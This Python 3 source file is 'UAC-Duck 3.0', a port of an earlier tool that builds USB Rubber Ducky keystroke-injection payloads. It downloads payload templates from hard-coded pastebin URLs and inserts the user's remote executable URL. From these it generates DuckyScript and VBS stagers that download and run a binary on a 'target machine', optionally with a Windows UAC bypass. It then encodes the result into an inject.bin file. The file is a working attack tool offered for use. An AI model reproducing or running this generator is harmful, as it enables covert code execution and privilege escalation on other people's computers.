###############################################################################
#
# Original creator of ducky script file : Skidde
# Creator of DuckyScript 3.0: Egbie
# Author : Egbie
# Version DuckyScript 3.0
# Written in Python 3
# Works only in python 3.x
#
# I WOULD LIKE TO BEGIN BY GIVE A SHOUT OUT TO SKIDDIE THE ORIGINAL
# CREATOR OF UAC-DUCK GENERATOR SCRIPT. MY WORK IS BASED OFF SKIDDIE
# SCRIPT WHICH IS IMPLEMENTED IN PYTHON 2.X. AND WITHOUT HIS WORK IT
# WOULD NOT HAVE BEEN POSSIBLE FOR ME TO CREATE THIS VERSION.
#
# HIS ORIGINAL SCRIPT CAN BE FOUND AT HIS GITHUB ACCOUNT LOCATED BELOW.
# HTTPS://GITHUB.COM/SKIDDIETECH/UAC-D-E-RUBBER-DUCKY/BLOB/MASTER/UAC-DUCK.PY
#
# I HAVED USED HIS WORK AND RE-WRITTEN IT SO THAT IT CAN NOW BE RUN FOR
# THOSE OF US WHO HAVE PYTHON 3.X.
#
# I WAS ABLE TO TEST CHOICES 1 AND 2 BUT WAS NOT ABLE TO TEST
# CHOICES 3 AND 4 AS THEY REQUIRE A RUBBER DUCKY AND I NO LONGER HAVE A
# RUBBER DUCKY.
#
# WELCOME TO THE MAD HOUSE AND LET THE HACKING BEGIN..
##############################################################################

import sys
import urllib
from urllib.request import urlopen
from time import sleep
from os.path import exists
from os import remove, system

WINDOW_SCRIPT_URL = "http://pastebin.com/raw/8nYdas2y"
PAYLOAD_VBS_URL   = "http://pastebin.com/raw/GBZZsPEe"
POWERSHELL_STAGER_URL = "http://pastebin.com/raw/mXLM5hrC"
DUCKY_URL = "http://github.com/hak5darren/USB-Rubber-Ducky/raw/master/duckencoder.jar"
DUCKY_PAYLOAD_URL = "http://pastebin.com/raw/apyPSqWs"

def gen_bin_script(lang=None):
	"""run_shell_command(str) -> return(None)

	When the function is invoked runs a system command that turns
	a ducky script into an inject.bin file.
	"""

	sleep(1)
	COMMAND = "java -jar Duckencoder.jar -i DuckyScript.txt -o inject.bin"
	if not lang == None:
		system("{} -l {}".format(COMMAND, lang))
	else:
		system("{}".format(COMMAND))

def check_file_ext(f, ext):
	"""check_file_ext(str, str) -> return(bool)

	Checks if a given file matches a given extenstion.
	Returns True if the file matches the extenstion
	else return False.

	:parameter
	   -  f : The file that would be used to check.
	   - ext: Checks the given file against this extenstion.

	>>> check_file_ext('evil_plans.txt', '.txt')
	True
	>>> check_file_ext('plans.txt.', '.exe')
	False
	"""
	return f.endswith(ext)

def clear_pre_existing_files():
	"""Removes any pre-existing files from the users directory."""

	files = ['DuckyScript.txt', 'UAC-Duck-Payload.vbs', 'inject.bin']
	for f in files:
		if exists(f):
			remove(f)

def download_file(url, string=True):
	"""download_file(str, bool(optional)) -> return(str)

	Downloads a file from a given url. If error occurrs while
	downloading an exception is raised.

	:parameter
	    - url   : The url to download data from.
		- string: String flag takes two arguments True or False. Default mode
				  True.
		          Becuase the urlopen downloads the data from the url in bytes.
				  The string flag job is to determines whether the data should
				  be decode as a utf-8 or not.

		          If the string flag is set to True it tells the function that
				  is okay to decoded into in a utf-8 format as we are expecting
				  the downloaded material to be in string format.

				  If the string flag is set to False it tells the function not
				  to decode in utf-8 because the data downloaded is not a string.
	"""
	try:
		data = urlopen(url).read()
		return data.decode('utf-8') if string else data
	except urllib.error.URLError:
		sys.exit("[-] The file could not be downloaded, please check url!!!")

def replace_value(string, old, new):
	"""replace_value(str, str, str) -> return(str)

	Takes a string and replaces the old values with the new ones.
	Returns a new string with the replace values.

	:parameters
	   - string: The string containing the elemnts that would be replaced.
	   -    old: The values located within the string that will be replaced.
	   -    new: The new value will replace the old values.
	"""
	return string.replace(old, new)

def write_to_file(string, file_name='DuckyScript.txt', flag='a'):
	"""write_to_file(str, str(optional), str(optional)) -> return(None)

	Takes a string and saves it to a file. If the default file
	name is not changed then any data saved will be saved to
	the DuckyScript.txt file.

	:parameter
	    - file_name: Default file name 'DuckyScript.txt'. If no
		             name entered any data entered would be saved
					 to this file.

		-     flags: Takes three optional flags 'a', 'wb', 'w'.
		             flag 'a'  : appends data to an existing file. Default mode.
			         flag 'wb' : writes to the data to a file in binary.
					             Any previous data will be over written.
			         flag 'w'  : writes new data to file. Over rides any
					             existing data.
	"""
	with open(file_name, flag) as user_file:
		user_file.write(string)

def gen_payload_duckyscript(uac_payload_url, file_name='update.vbs'):
	"""gen_payload_duckyscript(str, str(optional)) -> return(bool)

	Generates a ducky script. Returns True if everything
	went okay otherwise returns False.

	:parameters
	    uac_payload_url: Url contains the link to the location of payload script.
	          file_name: Saves the script with the file name to the user
	                      hard drive. Default name update.vbs.
	"""
	if not uac_payload_url:
		sys.exit('[-] Invalid Url!!')
	elif not file_name.endswith('.vbs'):
		file_name = 'update.vbs' # if the file does not end .vbs use default.

	# generates ducky script payload.
	powershell_script = replace_value(download_file(WINDOW_SCRIPT_URL),
	                                               '[URL]',
												    uac_payload_url.lower())

	write_to_file(replace_value(powershell_script, "[NAME]", file_name.lower()))
	print('\n[+] Payload DuckyScript.txt generated!!')
	sleep(1)

def ducky_encoder(lang='GB'):
	"""ducky_encoder(str) -> return(None)

	The ducky_encode encodes the script as an inject.bin file.
	If the language parameter is not False then the script is
	encoded into that language else it is encoded as GB English.

	:parmeter:
	   - lang: Language to encode into the script.
	"""
	if not exists('Duckencoder.jar'):
		print('\n[-] duckencoder.jar file was not found, beginning download please wait...')
		ducky_downloader()
		if exists('Duckencoder.jar'): # check if the file exists after download.
			print('[+] Successfully downloaded the duckencoder.jar file to local hard drive..')
		else:
			print('[-] Failed to create bin file because download was unsuccessful!!')
			print('[+] Try manually downloading the file and then try again.')
			return False

	print('[+] Please wait, the text will now be encoded into an inject.bin file ..')
	gen_bin_script(lang)

	if exists('inject.bin'):
		print("\n[+] Successfully encoded script with the language {}.".format(lang))
	else:
		print('\n[-] Failed to encode duckyscript.txt using language mode.')
		while True:
			ans = input('[+] Would you like to encode the duckyscript file without a language: (y/n) : ')
			if ans[0].lower() == 'n':
				return
			elif ans[0].lower() == 'y':
				print('[+] Beginning process please wait...')
				gen_bin_script(None) # run command without language
				if exists('inject.bin'):
					print("[+] Successfully encoded script.")
					break

	print('[+] There is now an inject.bin file in your local directoy.')

def ducky_downloader():
	"""ducky_downloader(None) -> return(None)

	Downloads a ducky file and saves it to the user local drive.
	"""
	write_to_file(download_file(DUCKY_URL, False),'Duckencoder.jar', 'wb')

def generate_script(online_version, uac_bypass, **kw):
	"""generate_script(str, str, kw) -> return(None)

	A thin wrap function thaworks by checking whether
	the binary script url is either the online or
	offline version. As well as whether to implement the
	script with either a UAC bypass or not.

	:parmaters:
	   -online_version:  Takes two values True and False. True means
	                     use the online version and False the offline
				         version.
		- uac_bypass:    Takes two values. True means implement the UAC bypass.

 		kw(keyword arguments)
		   - payload_url : The raw UAC VBS Payload URL. Recommended URL
		                   pastebin/raw e.g. http://pastebin.com/raw/VBSPAYLOAD.

		   - payload_name: Your payload will be saved using this name.
		   - stager_name : The UAC VBS script will be saved using this name.
		   - drive_name  : The drive for the rubber ducky.
	"""

	if online_version and not uac_bypass: # online version without UAC bypass

		# Generates a Payload Ducky Script
		power_shell_script = download_file(WINDOW_SCRIPT_URL)
		power_shell_script = replace_value(power_shell_script, '[URL]', kw['payload_url'])
		write_to_file(replace_value(power_shell_script, '[NAME]', kw['file_name']))
		print('\n[+] Payload DuckyScript.txt generated!!')

	elif online_version and uac_bypass: #  online version with UAC bypass

		# Generates a UAC-Duck-Payload.vbs payload
		ducky_script = download_file(DUCKY_PAYLOAD_URL)
		ducky_script = replace_value(ducky_script, '[URL]', kw['payload_url'])
		write_to_file(replace_value(ducky_script, '[NAME]',
		                            kw['file_name']),
		                            'UAC-Duck-Payload.vbs')

		print('\n[+] Payload UAC-Duck-Payload.vbs generated!')

	elif not online_version and not uac_bypass: # offline version without UAC bypass

		# Generates a payload Ducky Script and saves it to user local directory
		power_shell_script = download_file(POWERSHELL_STAGER_URL)
		power_shell_script = replace_value(power_shell_script,
		                                  '[DRIVENAME]',
										   kw['drive_name'])

		write_to_file(replace_value(power_shell_script,
		                            '[NAME]',
		                             kw['payload_name'] ))

		print('\n[+] Payload DuckyScript.txt generated!!')
		print("[+] Place your {} on your rubber ducky and rename.".format(kw['payload_name']))

	elif not online_version and uac_bypass: # offline version with UAC bypass

		# A two stage process. First a VBS stager will be generated
		# Next a payload script is generated.
		print("""
		[+] Two stages will be implemented..
		[+] First a VBS stager would be generated...
		[+] Second a ducky payload ducky script would be generated..""")

		# creates a vbs stager.
		vbs_payload_stager = download_file(PAYLOAD_VBS_URL)
		write_to_file(replace_value(vbs_payload_stager,
		                              '[NAME]',
									   kw['payload_name']))

		# creates a ducky script
		power_shell_script = download_file(POWERSHELL_STAGER_URL)
		power_shell_script = replace_value(power_shell_script,
		                                   '[NAME]',
		                                   kw['stager_name'])

		write_to_file(replace_value(power_shell_script,
		                            '[DRIVENAME]',
									 kw['drive_name']))

		print("\n[+] VBS Stager {} + generated!!".format(kw['stager_name']))
		sleep(1)
		print("[+] Payload DuckyScript.txt generated!!")
		sleep(1)
		print("[+] Place the {} file and your {} on your rubber ducky ".format(kw['stager_name'],
		                                                                       kw['payload_name']))
		sleep(1)
		print("[+] with drivename {} drive".format(kw['drive_name']))

def menu():
	"""The menu for the script."""

	print("""\n\n

	  _   _  _   ___   ___  _   _  ___ _  __
	 | | | |/_\ / __| |   \| | | |/ __| |/ /
	 | |_| / _ \ (__  | |) | |_| | (__| ' <
	  \___/_/ \_\___| |___/ \___/ \___|_|\_\

	  	\n\n
		Orignal creator of UAC-Duck Skiddie.
		Creator of UAC-DUCK 3.0 Egbie

	[+++++++++++++++++++++++++++++++++++++++]

	I would like to begin by give a shout out to Skiddie the original
	creator of UAC-Duck generator script. My work is based off Skiddie
	script which is implemented in python 2.x. And without his work it
	would not have been possible to create this.

	His original script can be found at his github account located below.
	https://github.com/SkiddieTech/UAC-D-E-Rubber-Ducky/blob/master/uac-duck.py

	I haved used his work and re-written it so that it can now be run for
	those of us who have python 3.x.

	Welcome to the mad house..

	-------------ONLINE-VERSION-------------------

	[1] Generate binary download and execute ducky script without UAC bypass.
	[2] Generate binary download and execute ducky script with UAC bypass.

	-------------OFFLINE-VERSION-------------------

	[3] Generate binary download & execute ducky script without UAC bypass.
	[4] Generate binary download & execute ducky script with UAC bypass.

	""")

	while True:
		choice = input('[+] Enter a number between (1-4) : ')
		if choice.isdigit():
			choice = int(choice)
			if 1 <= choice <= 5:
				 return choice

# the main program.
def main():

	if choice == 1 or choice == 2:
		while True:
			print('\n[+] Please enter your binary payload direct link URL( www.example.com/pay.exe):')
			binary_payload_url = input('[ONLINE] >>> (binary_payload_url) : ').lower()
			if check_file_ext(binary_payload_url, '.exe'):
				break

		print("\n[+] Enter a name to save your payload file as (Default: update.exe): ")
		print('[+] This will be stored on the target machine: ')
		file_name = input('[ONLINE]>>> (filename) : ')

		# choice 1 generates only a ducky script.
		if choice == 1:
			# use default extenstion if does not end with exe
			file_name = file_name if file_name.endswith('.exe') else 'update.exe'
			generate_script(True, False, payload_url=binary_payload_url, file_name=file_name)

	# choices 2 generates a ducky script and VBS script.
	if choice == 2:
		generate_script(True, True, payload_url=binary_payload_url, file_name=file_name)

		print("\n[+] Please upload this .vbs file as raw text format to a webserver(Pastebin works great)")
		sleep(1)
		print('[+] Pastebin/RAW recommended Example http://pastebin.com/raw/VBSPAYLOAD)')
		print('[+] Please now enter your UAC VBS Payload URL')
		uac_payload_url = input("ONLINE VERSION with UAC BYPASS >>> (UAC_VBS_payload_urL) : ")
		sleep(1)
		print('\n[+] Enter a name to save the UAC VBS Payload file as, default name (update.vbs): ')
		name = input('[ONLINE] >>> (file_name) : ').lower()
		gen_payload_duckyscript(uac_payload_url, name) if name else gen_payload_duckyscript(uac_payload_url)

	elif choice == 3 or choice == 4:

		while True:
			print("[+] Enter your binary payload name located on the drive e.g/ update.exe: ")
			payload_name = input('[OFFLINE] >>> (payload_name) : ')
			if check_file_ext(payload_name, '.exe'):
				break

		print("[+] Please input your Twin-Duck drive name e.g. backup. ")
		drive_name = input('[OFFLINE] >>> (drive_name) : ')

		msg = "[OFFLINE] Ducky D&E Blazing fast payload (Without UAC bypass) "
		if choice == 3:
			print(msg)
			generate_script(False, False, drive_name=drive_name, payload_name=payload_name)
		elif choice == 4:
			print(replace_value(msg, '(Without UAC bypass)', '(With UAC bypass)' ))

			while True:
				print("[OFFLINE] Please input your desired UAC VBS local filename(Example: update.vbs):")
				stager_name = input('[OFFLINE] >>> (UAC_VBS_LOCAL_FILENAME) : ')
				if check_file_ext(stager_name, '.vbs'):
					break
			generate_script(False, True, payload_name=payload_name,
			                drive_name=drive_name, stager_name=stager_name )

	while True:
		ans = input('[+] Would you like to encode your DuckyScript.txt into an inject bin file ("y/n/yes/no"): ')
		if ans[0].lower() == 'y':
			ans = input('[+] Enter a language to encode the script with. Default GB: ')

			print('[+] Encoding DuckyScript.txt as inject bin file please wait...')
			ducky_encoder() # encode ducky script to inject.bin file.
			break
		elif ans[0].lower() == 'n':
			break

	sys.exit('[+] Your payload has been generated. This screen will now exit bye.\n')

if __name__ == '__main__':
	clear_pre_existing_files()
	choice = menu()
	main()
